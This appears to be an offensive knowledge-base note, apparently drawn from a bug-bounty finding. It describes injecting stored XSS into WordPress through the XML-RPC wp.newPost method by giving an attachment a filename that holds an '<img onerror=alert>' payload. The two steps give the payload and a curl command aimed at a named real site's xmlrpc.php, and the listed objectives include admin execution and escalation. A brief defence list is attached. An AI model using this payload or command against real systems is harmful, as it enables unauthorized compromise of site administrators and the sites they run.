---
tags:
  - xss
  - stored-xss
  - xmlrpc
type: procedure
tools:
  - '[[tools/Curl-for-XMLRPC-Exploitation]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-xmlrpc-xss-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:31:52.539Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 8b167a20-b089-4088-ac84-69301f536163
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-via-Attachment-Name

## Summary

Injects JavaScript via a malicious filename in a WordPress attachment created through XMLRPC, leading to stored XSS executable in the admin Media list.

## Description

Use wp.newPost with post_type 'attachment', post_status 'publish', and 'file' parameter containing unescaped HTML like '<img src=x onerror=alert("xss")>'. Displayed without escaping in admin dashboard.

## Requirements

1. Authenticated XMLRPC
2. XSS payload ready
3. xss.xml file
4. Curl

## Defense

Defensive measures and detection strategies:

- Escape filenames in admin views
- Sanitize attachment metadata
- Use Content-Security-Policy
- Audit media for suspicious names

## Objectives

1. Store XSS payload
2. Target admin execution
3. Achieve escalation

## Instructions

### Step 1: Prepare XSS XML

**Context**: Set file param to XSS string.

**Command** ([[commands/curl-xmlrpc-xss-injection]]):
```bash
# xss.xml: wp.newPost with post_type='attachment', file='bugbounty"><img src=x onerror=alert("xss") onload=alert("xss")>''
```

> Includes full payload.

### Step 2: Create Malicious Attachment

**Context**: Inject into DB.

**Command** ([[commands/curl-xmlrpc-xss-injection]]):
```bash
curl 'https://newsroom.uber.com/us-new-york/xmlrpc.php' --data-binary "`cat xss.xml`" -H 'Content-type: application/xml'
```

> Returns ID; XSS stored.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/curl-xmlrpc-xss-injection]]

## Tools Used

- [[tools/Curl-for-XMLRPC-Exploitation]]

## Tags

- xss
- stored-xss
- xmlrpc
